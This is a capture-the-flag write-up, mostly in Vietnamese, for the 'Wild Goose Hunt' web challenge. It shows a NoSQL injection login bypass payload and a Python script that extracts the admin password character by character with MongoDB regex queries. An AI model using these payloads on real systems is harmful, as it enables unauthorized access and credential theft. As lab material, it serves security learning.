Wild Goose Hunt
===
### Description
Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?

### Solution
- Phân tích code: Kiểm tra sơ qua source code thì chúng ta không thấy flag nằm ở bất kì đâu trong source ngay cả khi đăng nhập thành công admin.
![image](https://user-images.githubusercontent.com/54855855/115963299-e994bf00-a548-11eb-8488-81a3522a430b.png)
Ở đoạn code này chúng ta nhập vào username và password và ở đây chương trình sử dụng mongo db nên mình nghĩ có thể là nosqli nên vì vậy mình thử với payload sau
`username[$ne]=a&password[$ne]=a` và kết quả chúng ta nhận được là `Login Successful, welcome back admin.` => khi đăng nhập thành công admin thì chúng ta cũng ko có flag. Tới đây mình nghĩ có thể là flag nằm ở trong db cụ thể là password của admin
Vì vậy mình sử dụng đoạn script sau để blind nó.

### Payload
```py
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="url/api/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'Login Successful' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```